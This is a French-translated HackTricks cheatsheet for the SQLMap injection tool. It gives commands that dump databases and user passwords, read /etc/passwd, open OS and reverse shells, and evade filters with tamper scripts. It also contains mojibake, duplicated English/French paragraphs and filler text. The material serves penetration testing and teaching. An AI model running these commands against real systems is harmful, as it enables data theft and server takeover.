# SQLMap - Cheatsheet

<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>‚òÅÔ∏è HackTricks Cloud ‚òÅÔ∏è</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>üê¶ Twitter üê¶</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>üéôÔ∏è Twitch üéôÔ∏è</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>üé• Youtube üé•</strong></a></summary>

* Travaillez-vous dans une **entreprise de cybers√©curit√©** ? Voulez-vous voir votre **entreprise annonc√©e dans HackTricks** ? Ou voulez-vous avoir acc√®s √† la **derni√®re version de PEASS ou t√©l√©charger HackTricks en PDF** ? Consultez les [**PLANS D'ABONNEMENT**](https://github.com/sponsors/carlospolop) !
* D√©couvrez [**La famille PEASS**](https://opensea.io/collection/the-peass-family), notre collection exclusive de [**NFT**](https://opensea.io/collection/the-peass-family)
* Obtenez le [**swag officiel PEASS & HackTricks**](https://peass.creator-spring.com)
* **Rejoignez le** [**üí¨**](https://emojipedia.org/speech-balloon/) [**groupe Discord**](https://discord.gg/hRep4RUj7f) ou le [**groupe Telegram**](https://t.me/peass) ou **suivez** moi sur **Twitter** [**üê¶**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks\_live)**.**
* **Partagez vos astuces de piratage en soumettant des PR au** [**repo hacktricks**](https://github.com/carlospolop/hacktricks) **et au** [**repo hacktricks-cloud**](https://github.com/carlospolop/hacktricks-cloud).

</details>

<figure><img src="../../../.gitbook/assets/image (1) (1) (2) (4).png" alt=""><figcaption></figcaption></figure>

[**DragonJAR Security Conference es un evento internacional de ciberseguridad**](https://www.dragonjarcon.org/) avec plus d'une d√©cennie qui se tiendra les 7 et 8 septembre 2023 √† Bogot√°, en Colombie. C'est un √©v√©nement de contenu technique de haut niveau o√π les derni√®res recherches en espagnol sont pr√©sent√©es, attirant des hackers et des chercheurs du monde entier.\
Inscrivez-vous d√®s maintenant sur le lien suivant et ne manquez pas cette grande conf√©rence !:

{% embed url="https://www.dragonjarcon.org/" %}

## Arguments de base pour SQLmap

### G√©n√©riques
```bash
-u "<URL>"
-p "<PARAM TO TEST>"
--user-agent=SQLMAP
--random-agent
--threads=10
--risk=3 #MAX
--level=5 #MAX
--dbms="<KNOWN DB TECH>"
--os="<OS>"
--technique="UB" #Use only techniques UNION and BLIND in that order (default "BEUSTQ")
--batch #Non interactive mode, usually Sqlmap will ask you questions, this accepts the default answers
--auth-type="<AUTH>" #HTTP authentication type (Basic, Digest, NTLM or PKI)
--auth-cred="<AUTH>" #HTTP authentication credentials (name:password)
--proxy=http://127.0.0.1:8080
--union-char "GsFRts2" #Help sqlmap identify union SQLi techniques with a weird union char
```
#### Interne

##### Database

###### Base de donn√©es

To retrieve information from the internal database, you can use SQL injection techniques. SQLMap is a powerful tool that automates the process of detecting and exploiting SQL injection vulnerabilities.

Pour r√©cup√©rer des informations de la base de donn√©es interne, vous pouvez utiliser des techniques d'injection SQL. SQLMap est un outil puissant qui automatise le processus de d√©tection et d'exploitation des vuln√©rabilit√©s d'injection SQL.

To use SQLMap, you need to provide the target URL and specify the parameters vulnerable to SQL injection. SQLMap will then analyze the target and attempt to exploit the vulnerabilities.

Pour utiliser SQLMap, vous devez fournir l'URL cible et sp√©cifier les param√®tres vuln√©rables √† l'injection SQL. SQLMap analysera ensuite la cible et tentera d'exploiter les vuln√©rabilit√©s.

Here is an example command to retrieve information from the internal database using SQLMap:

Voici un exemple de commande pour r√©cup√©rer des informations de la base de donn√©es interne √† l'aide de SQLMap :

```
sqlmap -u http://example.com/page.php?id=1 --dbs
```

This command tells SQLMap to target the URL `http://example.com/page.php?id=1` and retrieve the list of databases (`--dbs`) available in the internal database.

Cette commande indique √† SQLMap de cibler l'URL `http://example.com/page.php?id=1` et de r√©cup√©rer la liste des bases de donn√©es (`--dbs`) disponibles dans la base de donn√©es interne.

Once you have identified the database you want to explore, you can use SQLMap to retrieve the tables and columns within that database.

Une fois que vous avez identifi√© la base de donn√©es que vous souhaitez explorer, vous pouvez utiliser SQLMap pour r√©cup√©rer les tables et les colonnes de cette base de donn√©es.

Here is an example command to retrieve the tables from a specific database:

Voici un exemple de commande pour r√©cup√©rer les tables d'une base de donn√©es sp√©cifique :

```
sqlmap -u http://example.com/page.php?id=1 -D database_name --tables
```

Replace `database_name` with the name of the database you want to explore.

Remplacez `database_name` par le nom de la base de donn√©es que vous souhaitez explorer.

Once you have retrieved the tables, you can further explore the database by retrieving the columns within a specific table.

Une fois que vous avez r√©cup√©r√© les tables, vous pouvez explorer davantage la base de donn√©es en r√©cup√©rant les colonnes d'une table sp√©cifique.

Here is an example command to retrieve the columns from a specific table:

Voici un exemple de commande pour r√©cup√©rer les colonnes d'une table sp√©cifique :

```
sqlmap -u http://example.com/page.php?id=1 -D database_name -T table_name --columns
```

Replace `database_name` with the name of the database and `table_name` with the name of the table you want to explore.

Remplacez `database_name` par le nom de la base de donn√©es et `table_name` par le nom de la table que vous souhaitez explorer.

By using SQLMap, you can easily retrieve information from the internal database and gain valuable insights for further exploitation.

En utilisant SQLMap, vous pouvez facilement r√©cup√©rer des informations de la base de donn√©es interne et obtenir des informations pr√©cieuses pour une exploitation ult√©rieure.
```bash
--current-user #Get current user
--is-dba #Check if current user is Admin
--hostname #Get hostname
--users #Get usernames od DB
--passwords #Get passwords of users in DB
--privileges #Get privileges
```
#### Donn√©es de la base de donn√©es
```bash
--all #Retrieve everything
--dump #Dump DBMS database table entries
--dbs #Names of the available databases
--tables #Tables of a database ( -D <DB NAME> )
--columns #Columns of a table  ( -D <DB NAME> -T <TABLE NAME> )
-D <DB NAME> -T <TABLE NAME> -C <COLUMN NAME> #Dump column
```
## Emplacement de l'injection

### √Ä partir de la capture Burp/ZAP

Capturez la requ√™te et cr√©ez un fichier req.txt
```bash
sqlmap -r req.txt --current-user
```
### Injection de requ√™te GET

In this section, we will discuss how to perform SQL injection attacks on GET requests using SQLMap. 

Dans cette section, nous discuterons de la mani√®re d'effectuer des attaques par injection SQL sur les requ√™tes GET √† l'aide de SQLMap.

#### Introduction

SQL injection is a common vulnerability that occurs when an attacker can manipulate the input parameters of a web application's SQL query. By injecting malicious SQL code, an attacker can manipulate the query's logic and potentially gain unauthorized access to the database.

L'injection SQL est une vuln√©rabilit√© courante qui se produit lorsque un attaquant peut manipuler les param√®tres d'entr√©e d'une requ√™te SQL d'une application web. En injectant du code SQL malveillant, un attaquant peut manipuler la logique de la requ√™te et potentiellement acc√©der de mani√®re non autoris√©e √† la base de donn√©es.

GET requests are commonly used to retrieve data from a web server. By injecting SQL code into the parameters of a GET request, an attacker can modify the SQL query and potentially extract sensitive information from the database.

Les requ√™tes GET sont couramment utilis√©es pour r√©cup√©rer des donn√©es √† partir d'un serveur web. En injectant du code SQL dans les param√®tres d'une requ√™te GET, un attaquant peut modifier la requ√™te SQL et potentiellement extraire des informations sensibles de la base de donn√©es.

#### Using SQLMap for GET Request Injection

SQLMap is a powerful tool that automates the process of detecting and exploiting SQL injection vulnerabilities. It supports various techniques for injecting SQL code into different parts of a web application.

SQLMap est un outil puissant qui automatise le processus de d√©tection et d'exploitation des vuln√©rabilit√©s d'injection SQL. Il prend en charge diff√©rentes techniques pour injecter du code SQL dans diff√©rentes parties d'une application web.

To perform a SQL injection attack on a GET request using SQLMap, you need to provide the target URL and specify the vulnerable parameter. SQLMap will then analyze the target and attempt to exploit the SQL injection vulnerability.

Pour effectuer une attaque par injection SQL sur une requ√™te GET √† l'aide de SQLMap, vous devez fournir l'URL cible et sp√©cifier le param√®tre vuln√©rable. SQLMap analysera ensuite la cible et tentera d'exploiter la vuln√©rabilit√© d'injection SQL.

Here is an example command to perform a SQL injection attack on a GET request using SQLMap:

Voici une commande exemple pour effectuer une attaque par injection SQL sur une requ√™te GET √† l'aide de SQLMap :

```
sqlmap -u "http://example.com/page.php?id=1" -p "id"
```

In this command, `-u` specifies the target URL, and `-p` specifies the vulnerable parameter. SQLMap will automatically detect the SQL injection vulnerability and attempt to exploit it.

Dans cette commande, `-u` sp√©cifie l'URL cible et `-p` sp√©cifie le param√®tre vuln√©rable. SQLMap d√©tectera automatiquement la vuln√©rabilit√© d'injection SQL et tentera de l'exploiter.

#### Conclusion

Performing SQL injection attacks on GET requests can be a powerful technique for exploiting vulnerabilities in web applications. By understanding how to use tools like SQLMap, you can effectively identify and exploit SQL injection vulnerabilities, helping to secure web applications against potential attacks.

Effectuer des attaques par injection SQL sur des requ√™tes GET peut √™tre une technique puissante pour exploiter les vuln√©rabilit√©s des applications web. En comprenant comment utiliser des outils comme SQLMap, vous pouvez identifier et exploiter efficacement les vuln√©rabilit√©s d'injection SQL, contribuant ainsi √† s√©curiser les applications web contre d'√©ventuelles attaques.
```bash
sqlmap -u "http://example.com/?id=1" -p id
sqlmap -u "http://example.com/?id=*" -p id
```
### Injection de requ√™te POST

When performing a penetration test, it is common to encounter web applications that use POST requests to send data to the server. In some cases, these POST requests may be vulnerable to SQL injection attacks. SQLMap is a powerful tool that can be used to automate the process of identifying and exploiting SQL injection vulnerabilities in POST requests.

Lors de l'ex√©cution d'un test de p√©n√©tration, il est courant de rencontrer des applications web qui utilisent des requ√™tes POST pour envoyer des donn√©es au serveur. Dans certains cas, ces requ√™tes POST peuvent √™tre vuln√©rables aux attaques par injection SQL. SQLMap est un outil puissant qui peut √™tre utilis√© pour automatiser le processus d'identification et d'exploitation des vuln√©rabilit√©s d'injection SQL dans les requ√™tes POST.

To use SQLMap with POST requests, you will need to capture the request using a proxy tool such as Burp Suite or OWASP ZAP. Once you have captured the request, you can save it to a file and then use SQLMap to analyze and exploit any SQL injection vulnerabilities.

Pour utiliser SQLMap avec des requ√™tes POST, vous devrez capturer la requ√™te √† l'aide d'un outil de proxy tel que Burp Suite ou OWASP ZAP. Une fois que vous avez captur√© la requ√™te, vous pouvez l'enregistrer dans un fichier, puis utiliser SQLMap pour analyser et exploiter les √©ventuelles vuln√©rabilit√©s d'injection SQL.

To specify a POST request in SQLMap, you can use the `-r` option followed by the path to the file containing the request. SQLMap will then analyze the request and attempt to identify any SQL injection vulnerabilities.

Pour sp√©cifier une requ√™te POST dans SQLMap, vous pouvez utiliser l'option `-r` suivie du chemin vers le fichier contenant la requ√™te. SQLMap analysera ensuite la requ√™te et tentera d'identifier les √©ventuelles vuln√©rabilit√©s d'injection SQL.

```
sqlmap -r /path/to/request.txt
```

Once SQLMap has identified a SQL injection vulnerability, you can use various options and techniques to exploit it. SQLMap can automatically retrieve database information, dump tables, and even execute operating system commands on the server.

Une fois que SQLMap a identifi√© une vuln√©rabilit√© d'injection SQL, vous pouvez utiliser diff√©rentes options et techniques pour l'exploiter. SQLMap peut automatiquement r√©cup√©rer des informations sur la base de donn√©es, extraire des tables et m√™me ex√©cuter des commandes du syst√®me d'exploitation sur le serveur.

It is important to note that SQL injection attacks can be highly destructive and can lead to data breaches or unauthorized access to sensitive information. Therefore, it is crucial to obtain proper authorization and perform penetration testing only on systems that you have permission to test.

Il est important de noter que les attaques par injection SQL peuvent √™tre tr√®s destructrices et peuvent entra√Æner des violations de donn√©es ou un acc√®s non autoris√© √† des informations sensibles. Par cons√©quent, il est crucial d'obtenir une autorisation appropri√©e et de r√©aliser des tests de p√©n√©tration uniquement sur des syst√®mes pour lesquels vous avez la permission de tester.
```bash
sqlmap -u "http://example.com" --data "username=*&password=*"
```
### Injections dans les en-t√™tes et autres m√©thodes HTTP

When performing a web application penetration test, it is important to thoroughly test for vulnerabilities in not only the request parameters but also in the headers and other HTTP methods. Attackers can exploit these areas to perform various types of injections, including SQL injection, command injection, and OS command injection.

#### SQL Injection

SQL injection occurs when an attacker is able to manipulate the SQL query being executed by the application. This can happen when user-supplied input is not properly validated or sanitized before being included in the query. By injecting malicious SQL code, an attacker can manipulate the query to perform unauthorized actions, such as extracting sensitive information from the database or modifying its contents.

To test for SQL injection in headers and other HTTP methods, tools like SQLMap can be used. SQLMap is a powerful open-source penetration testing tool that automates the process of detecting and exploiting SQL injection vulnerabilities. It supports various techniques, such as time-based blind SQL injection and error-based SQL injection.

#### Command Injection

Command injection occurs when an attacker is able to execute arbitrary commands on the underlying operating system. This can happen when user-supplied input is passed to a system command without proper validation or sanitization. By injecting malicious commands, an attacker can execute arbitrary code, gain unauthorized access, or perform other malicious activities.

To test for command injection in headers and other HTTP methods, tools like SQLMap can also be used. SQLMap supports command injection testing by allowing the execution of arbitrary commands through the injection point.

#### OS Command Injection

OS command injection is similar to command injection, but it specifically targets the underlying operating system. By injecting malicious commands, an attacker can execute arbitrary commands on the operating system, potentially gaining full control over the system.

To test for OS command injection in headers and other HTTP methods, tools like SQLMap can be utilized. SQLMap supports OS command injection testing by allowing the execution of arbitrary commands on the underlying operating system.

It is important to thoroughly test for injections in headers and other HTTP methods during a web application penetration test to ensure the security of the application. By identifying and fixing these vulnerabilities, the risk of unauthorized access and data leakage can be significantly reduced.
```bash
#Inside cookie
sqlmap  -u "http://example.com" --cookie "mycookies=*"

#Inside some header
sqlmap -u "http://example.com" --headers="x-forwarded-for:127.0.0.1*"
sqlmap -u "http://example.com" --headers="referer:*"

#PUT Method
sqlmap --method=PUT -u "http://example.com" --headers="referer:*"

#The injection is located at the '*'
```
### Indiquer la cha√Æne lorsque l'injection est r√©ussie

Lorsque l'injection SQL est r√©ussie, vous pouvez utiliser l'option `--string` pour indiquer une cha√Æne sp√©cifique qui appara√Æt dans la r√©ponse de la requ√™te. Cela peut √™tre utile pour confirmer que l'injection a √©t√© effectu√©e avec succ√®s.

Par exemple, si vous savez qu'une injection r√©ussie affiche la cha√Æne "Bienvenue", vous pouvez utiliser la commande suivante :

```
sqlmap -u "http://example.com/page.php?id=1" --string="Bienvenue"
```

Cela permettra √† sqlmap de rechercher la cha√Æne "Bienvenue" dans la r√©ponse de la requ√™te et de confirmer que l'injection a √©t√© r√©ussie si elle est pr√©sente.
```bash
--string="string_showed_when_TRUE"
```
### Eval

**Sqlmap** permet d'utiliser l'option `-e` ou `--eval` pour traiter chaque charge utile avant de l'envoyer avec une ligne de code python. Cela facilite et acc√©l√®re le traitement personnalis√© de la charge utile avant de l'envoyer. Dans l'exemple suivant, la **session cookie flask** **est sign√©e par flask avec le secret connu avant de l'envoyer** :
```bash
sqlmap http://1.1.1.1/sqli --eval "from flask_unsign import session as s; session = s.sign({'uid': session}, secret='SecretExfilratedFromTheMachine')" --cookie="session=*" --dump
```
### Shell

Le shell est un programme informatique qui permet √† l'utilisateur d'interagir avec le syst√®me d'exploitation. Il fournit une interface en ligne de commande pour ex√©cuter des commandes et des scripts. Le shell est un outil essentiel pour les hackers, car il leur permet d'ex√©cuter des commandes et d'acc√©der aux fonctionnalit√©s du syst√®me d'exploitation. Il existe diff√©rents types de shell, tels que Bash, PowerShell et Zsh, qui offrent des fonctionnalit√©s avanc√©es et des options de personnalisation. Les hackers utilisent souvent le shell pour ex√©cuter des commandes de piratage, telles que l'injection SQL, l'exploitation de vuln√©rabilit√©s et la r√©cup√©ration de donn√©es sensibles.
```bash
#Exec command
python sqlmap.py -u "http://example.com/?id=1" -p id --os-cmd whoami

#Simple Shell
python sqlmap.py -u "http://example.com/?id=1" -p id --os-shell

#Dropping a reverse-shell / meterpreter
python sqlmap.py -u "http://example.com/?id=1" -p id --os-pwn
```
### Lire un fichier

To read a file using SQL injection, you can use the `LOAD_FILE()` function in MySQL. This function allows you to read the contents of a file on the server.

To use `LOAD_FILE()`, you need to provide the path to the file you want to read. The path should be an absolute path, starting from the root directory of the server.

Here is an example of how to use `LOAD_FILE()` to read a file:

```sql
SELECT LOAD_FILE('/path/to/file.txt');
```

Replace `/path/to/file.txt` with the actual path to the file you want to read.

Keep in mind that the MySQL user executing the query needs to have the necessary permissions to access the file. If the user doesn't have the required permissions, the `LOAD_FILE()` function will return `NULL`.

It's important to note that reading files using SQL injection can be illegal and unethical if done without proper authorization. Always ensure that you have the necessary permissions and legal authorization before attempting any file reading operations.
```bash
--file-read=/etc/passwd
```
### Parcourir un site web avec SQLmap et auto-exploiter

SQLmap est un outil puissant utilis√© pour d√©tecter et exploiter les vuln√©rabilit√©s d'injection SQL dans les applications web. Il peut √™tre utilis√© pour automatiser le processus de d√©couverte et d'exploitation des failles de s√©curit√© li√©es √† l'injection SQL.

Pour parcourir un site web avec SQLmap et exploiter automatiquement les vuln√©rabilit√©s, suivez les √©tapes suivantes :

1. **Analyse du site web** : Utilisez la commande suivante pour analyser le site web cible et d√©tecter les vuln√©rabilit√©s d'injection SQL :

   ```
   sqlmap -u <URL> --crawl=3 --batch
   ```

   Assurez-vous de remplacer `<URL>` par l'URL du site web que vous souhaitez analyser. L'option `--crawl=3` permet √† SQLmap de parcourir jusqu'√† 3 niveaux de profondeur pour trouver des liens et des formulaires √† analyser. L'option `--batch` permet d'ex√©cuter SQLmap en mode non interactif.

2. **Exploitation automatique** : Une fois que SQLmap a termin√© l'analyse du site web, vous pouvez utiliser la commande suivante pour exploiter automatiquement les vuln√©rabilit√©s d'injection SQL d√©tect√©es :

   ```
   sqlmap -u <URL> --crawl=3 --batch --dump-all
   ```

   Cette commande ex√©cute SQLmap en mode non interactif et utilise l'option `--dump-all` pour extraire toutes les donn√©es de la base de donn√©es vuln√©rable.

   Assurez-vous de remplacer `<URL>` par l'URL du site web cible.

3. **Analyse des r√©sultats** : Une fois que SQLmap a termin√© l'exploitation automatique, vous pouvez analyser les r√©sultats pour trouver les informations sensibles extraites de la base de donn√©es vuln√©rable.

   Les r√©sultats seront affich√©s dans le r√©pertoire de travail actuel, dans un fichier nomm√© `dump.csv`.

En suivant ces √©tapes, vous pourrez utiliser SQLmap pour parcourir un site web, d√©tecter les vuln√©rabilit√©s d'injection SQL et exploiter automatiquement ces failles pour extraire des informations sensibles de la base de donn√©es.
```bash
sqlmap -u "http://example.com/" --crawl=1 --random-agent --batch --forms --threads=5 --level=5 --risk=3

--batch = non interactive mode, usually Sqlmap will ask you questions, this accepts the default answers
--crawl = how deep you want to crawl a site
--forms = Parse and test forms
```
### Injection de second ordre

Second Order Injection is a technique where an attacker injects malicious code into a web application that is stored in a database or other persistent storage. This code is then executed when the application retrieves and uses the stored data.

La Injection de second ordre est une technique o√π un attaquant injecte du code malveillant dans une application web qui est stock√©e dans une base de donn√©es ou autre support de stockage persistant. Ce code est ensuite ex√©cut√© lorsque l'application r√©cup√®re et utilise les donn√©es stock√©es.

This type of injection can be more difficult to detect and exploit compared to traditional SQL injection, as the malicious code is not executed immediately upon injection. Instead, it is executed at a later time when the application retrieves the stored data.

Ce type d'injection peut √™tre plus difficile √† d√©tecter et √† exploiter par rapport √† l'injection SQL traditionnelle, car le code malveillant n'est pas ex√©cut√© imm√©diatement apr√®s l'injection. Au lieu de cela, il est ex√©cut√© ult√©rieurement lorsque l'application r√©cup√®re les donn√©es stock√©es.

To exploit a second order injection vulnerability, an attacker typically needs to find a way to store their malicious code in the application's database or other persistent storage. This can be achieved through various means, such as submitting user input that is not properly sanitized or leveraging other vulnerabilities in the application.

Pour exploiter une vuln√©rabilit√© d'injection de second ordre, un attaquant doit g√©n√©ralement trouver un moyen de stocker son code malveillant dans la base de donn√©es de l'application ou autre support de stockage persistant. Cela peut √™tre r√©alis√© de diff√©rentes mani√®res, telles que la soumission d'une entr√©e utilisateur qui n'est pas correctement d√©sinfect√©e ou en exploitant d'autres vuln√©rabilit√©s de l'application.

Once the malicious code is stored, it can be triggered when the application retrieves and uses the stored data. This can lead to various types of attacks, such as remote code execution, data manipulation, or privilege escalation.

Une fois que le code malveillant est stock√©, il peut √™tre d√©clench√© lorsque l'application r√©cup√®re et utilise les donn√©es stock√©es. Cela peut entra√Æner diff√©rents types d'attaques, telles que l'ex√©cution de code √† distance, la manipulation de donn√©es ou l'escalade de privil√®ges.

To prevent second order injection attacks, it is important to properly sanitize and validate all user input before storing it in the application's database or other persistent storage. Additionally, regular security testing and code reviews can help identify and mitigate potential vulnerabilities.

Pour pr√©venir les attaques d'injection de second ordre, il est important de d√©sinfecter et de valider correctement toutes les entr√©es utilisateur avant de les stocker dans la base de donn√©es de l'application ou autre support de stockage persistant. De plus, des tests de s√©curit√© r√©guliers et des examens de code peuvent aider √† identifier et √† att√©nuer les vuln√©rabilit√©s potentielles.
```bash
python sqlmap.py -r /tmp/r.txt --dbms MySQL --second-order "http://targetapp/wishlist" -v 3
sqlmap -r 1.txt -dbms MySQL -second-order "http://<IP/domain>/joomla/administrator/index.php" -D "joomla" -dbs
```
[**Lisez cet article**](second-order-injection-sqlmap.md) **sur la fa√ßon d'effectuer des injections de second ordre simples et complexes avec sqlmap.**

## Laboratoires pour s'entra√Æner

* Apprenez √† utiliser sqlmap en l'utilisant dans la **salle THM**:

{% embed url="https://tryhackme.com/room/sqlmap" %}

## Personnalisation de l'injection

### D√©finir un suffixe
```bash
python sqlmap.py -u "http://example.com/?id=1"  -p id --suffix="-- "
```
### Pr√©fixe
```bash
python sqlmap.py -u "http://example.com/?id=1"  -p id --prefix="') "
```
### Aide pour trouver une injection bool√©enne

---

#### Description

La technique d'injection bool√©enne est une m√©thode couramment utilis√©e pour exploiter les vuln√©rabilit√©s de s√©curit√© dans les applications web. Elle consiste √† manipuler les requ√™tes SQL en ins√©rant des expressions bool√©ennes afin de d√©terminer si une condition est vraie ou fausse.

L'outil `sqlmap` est un outil de test d'injection SQL automatis√© qui peut √™tre utilis√© pour d√©tecter et exploiter les vuln√©rabilit√©s d'injection SQL, y compris les injections bool√©ennes.

#### Utilisation de `sqlmap` pour trouver une injection bool√©enne

Pour utiliser `sqlmap` afin de trouver une injection bool√©enne, suivez les √©tapes suivantes :

1. Lancez `sqlmap` en sp√©cifiant l'URL de la cible :

   ```bash
   sqlmap -u <URL de la cible>
   ```

2. Utilisez l'option `--dbs` pour extraire les noms des bases de donn√©es :

   ```bash
   sqlmap -u <URL de la cible> --dbs
   ```

3. S√©lectionnez la base de donn√©es cible en utilisant l'option `--db` :

   ```bash
   sqlmap -u <URL de la cible> --db=<nom de la base de donn√©es>
   ```

4. Utilisez l'option `--tables` pour extraire les noms des tables de la base de donn√©es cible :

   ```bash
   sqlmap -u <URL de la cible> --db=<nom de la base de donn√©es> --tables
   ```

5. S√©lectionnez la table cible en utilisant l'option `--table` :

   ```bash
   sqlmap -u <URL de la cible> --db=<nom de la base de donn√©es> --table=<nom de la table>
   ```

6. Utilisez l'option `--columns` pour extraire les noms des colonnes de la table cible :

   ```bash
   sqlmap -u <URL de la cible> --db=<nom de la base de donn√©es> --table=<nom de la table> --columns
   ```

7. S√©lectionnez les colonnes cibles en utilisant l'option `--dump` :

   ```bash
   sqlmap -u <URL de la cible> --db=<nom de la base de donn√©es> --table=<nom de la table> --columns=<noms des colonnes> --dump
   ```

8. `sqlmap` affichera les donn√©es extraites de la base de donn√©es cible, y compris les √©ventuelles informations sensibles.

---

Pour plus d'informations sur l'utilisation de `sqlmap`, consultez la documentation officielle : [https://github.com/sqlmapproject/sqlmap/wiki](https://github.com/sqlmapproject/sqlmap/wiki)
```bash
# The --not-string "string" will help finding a string that does not appear in True responses (for finding boolean blind injection)
sqlmap -r r.txt -p id --not-string ridiculous --batch
```
### Alt√©rer

Rappelez-vous que **vous pouvez cr√©er votre propre alt√©ration en python** et c'est tr√®s simple. Vous pouvez trouver un exemple d'alt√©ration dans la [page d'injection de second ordre ici](second-order-injection-sqlmap.md).
```bash
--tamper=name_of_the_tamper
#In kali you can see all the tampers in /usr/share/sqlmap/tamper
```
| Tamper                       | Description                                                                                                                        |
| ---------------------------- | ---------------------------------------------------------------------------------------------------------------------------------- |
| apostrophemask.py            | Remplace le caract√®re apostrophe par son homologue en pleine largeur UTF-8                                                                |
| apostrophenullencode.py      | Remplace le caract√®re apostrophe par son homologue double unicode ill√©gal                                                          |
| appendnullbyte.py            | Ajoute un caract√®re NULL encod√© √† la fin de la charge utile                                                                          |
| base64encode.py              | Encode en base64 tous les caract√®res d'une charge utile donn√©e                                                                                           |
| between.py                   | Remplace l'op√©rateur sup√©rieur ('>') par 'NOT BETWEEN 0 AND #'                                                                    |
| bluecoat.py                  | Remplace l'espace apr√®s l'instruction SQL par un caract√®re vide al√©atoire valide. Ensuite, remplace le caract√®re = par l'op√©rateur LIKE |
| chardoubleencode.py          | Double l'encodage URL de tous les caract√®res d'une charge utile donn√©e (sans traiter ceux d√©j√† encod√©s)                                              |
| commalesslimit.py            | Remplace les occurrences de 'LIMIT M, N' par 'LIMIT N OFFSET M'                                                                       |
| commalessmid.py              | Remplace les occurrences de 'MID(A, B, C)' par 'MID(A FROM B FOR C)'                                                                  |
| concat2concatws.py           | Remplace les occurrences de 'CONCAT(A, B)' par 'CONCAT\_WS(MID(CHAR(0), 0, 0), A, B)'                                                 |
| charencode.py                | Encode en URL tous les caract√®res d'une charge utile donn√©e (sans traiter ceux d√©j√† encod√©s)                                                     |
| charunicodeencode.py         | Encode en URL Unicode les caract√®res non encod√©s d'une charge utile donn√©e (sans traiter ceux d√©j√† encod√©s). "%u0022"                           |
| charunicodeescape.py         | Encode en URL Unicode les caract√®res non encod√©s d'une charge utile donn√©e (sans traiter ceux d√©j√† encod√©s). "\u0022"                           |
| equaltolike.py               | Remplace toutes les occurrences de l'op√©rateur √©gal ('=') par l'op√©rateur 'LIKE'                                                               |
| escapequotes.py              | √âchappe les guillemets (' et ")                                                                                                      |
| greatest.py                  | Remplace l'op√©rateur sup√©rieur ('>') par son homologue 'GREATEST'                                                                   |
| halfversionedmorekeywords.py | Ajoute un commentaire MySQL versionn√© avant chaque mot-cl√©                                                                                   |
| ifnull2ifisnull.py           | Remplace les occurrences de 'IFNULL(A, B)' par 'IF(ISNULL(A), B, A)'                                                                  |
| modsecurityversioned.py      | Encadre la requ√™te compl√®te avec un commentaire versionn√©                                                                                     |
| modsecurityzeroversioned.py  | Encadre la requ√™te compl√®te avec un commentaire de version z√©ro                                                                                |
| multiplespaces.py            | Ajoute plusieurs espaces autour des mots-cl√©s SQL                                                                                           |
| nonrecursivereplacement.py   | Remplace les mots-cl√©s SQL pr√©d√©finis par des repr√©sentations adapt√©es au remplacement (par exemple, .replace("SELECT", "")) filtres               |
| percentage.py                | Ajoute un signe de pourcentage ('%') devant chaque caract√®re                                                                             |
| overlongutf8.py              | Convertit tous les caract√®res d'une charge utile donn√©e (sans traiter ceux d√©j√† encod√©s)                                                        |
| randomcase.py                | Remplace chaque caract√®re de mot-cl√© par une valeur de casse al√©atoire                                                                             |
| randomcomments.py            | Ajoute des commentaires al√©atoires aux mots-cl√©s SQL                                                                                                |
| securesphere.py              | Ajoute une cha√Æne sp√©cialement con√ßue                                                                                                     |
| sp\_password.py              | Ajoute 'sp\_password' √† la fin de la charge utile pour l'obfuscation automatique des journaux du DBMS                                          |
| space2comment.py             | Remplace l'espace (' ') par des commentaires                                                                                       |
| space2dash.py                | Remplace l'espace (' ') par un commentaire de tiret ('--') suivi d'une cha√Æne al√©atoire et d'un saut de ligne ('\n')                        |
| space2hash.py                | Remplace l'espace (' ') par un caract√®re di√®se ('#') suivi d'une cha√Æne al√©atoire et d'un saut de ligne ('\n')                      |
| space2morehash.py            | Remplace l'espace (' ') par un caract√®re di√®se ('#') suivi d'une cha√Æne al√©atoire et d'un saut de ligne ('\n')                      |
| space2mssqlblank.py          | Remplace l'espace (' ') par un caract√®re vide al√©atoire issu d'un ensemble valide de caract√®res alternatifs                              |
| space2mssqlhash.py           | Remplace l'espace (' ') par un caract√®re di√®se ('#') suivi d'un saut de ligne ('\n')                                          |
| space2mysqlblank.py          | Remplace l'espace (' ') par un caract√®re vide al√©atoire issu d'un ensemble valide de caract√®res alternatifs                              |
| space2mysqldash.py           | Remplace l'espace (' ') par un commentaire de tiret ('--') suivi d'un saut de ligne ('\n')                                            |
| space2plus.py                | Remplace l'espace (' ') par un signe plus ('+')                                                                                     |
| space2randomblank.py         | Remplace l'espace (' ') par un caract√®re vide al√©atoire issu d'un ensemble valide de caract√®res alternatifs                              |
| symboliclogical.py           | Remplace les op√©rateurs logiques AND et OR par leurs homologues symboliques (&& et                                                     |
| unionalltounion.py           | Remplace UNION ALL SELECT par UNION SELECT                                                                                        |
| unmagicquotes.py             | Remplace le caract√®re de citation (') par une combinaison multioctet %bf%27 avec un commentaire g√©n√©rique √† la fin (pour le faire fonctionner)             |
| uppercase.py                 | Remplace chaque caract√®re de mot-cl√© par la valeur en majuscule 'INSERT'                                                                     |
| varnish.py                   | Ajoute un en-t√™te HTTP 'X-originating-IP'                                                                                            |
| versionedkeywords.py         | Encadre chaque mot-cl√© non fonctionnel avec un commentaire MySQL versionn√©                                                                    |
| versionedmorekeywords.py     | Encadre chaque mot-cl√© avec un commentaire MySQL versionn√©                                                                                 |
| xforwardedfor.py             | Ajoute un en-t√™te HTTP fictif 'X-Forwarded-For'                                                                                        |

<figure><img src="../../../.gitbook/assets/image (1) (1) (2) (4).png" alt=""><figcaption></figcaption></figure>

[**DragonJAR Security Conference es un evento internacional de ciberseguridad**](https://www.dragonjarcon.org/) con m√°s de una d√©cada que se celebrar√° el 7 y 8 de septiembre de 2023 en Bogot√°, Colombia. Es un evento de gran contenido t√©cnico donde se presentan las √∫ltimas investigaciones en espa√±ol que atrae a hackers e investigadores de todo el mundo.\
¬°Reg√≠strate ahora en el siguiente enlace y no te pierdas esta gran conferencia!:

{% embed url="https://www.dragonjarcon.org/" %}

<details>

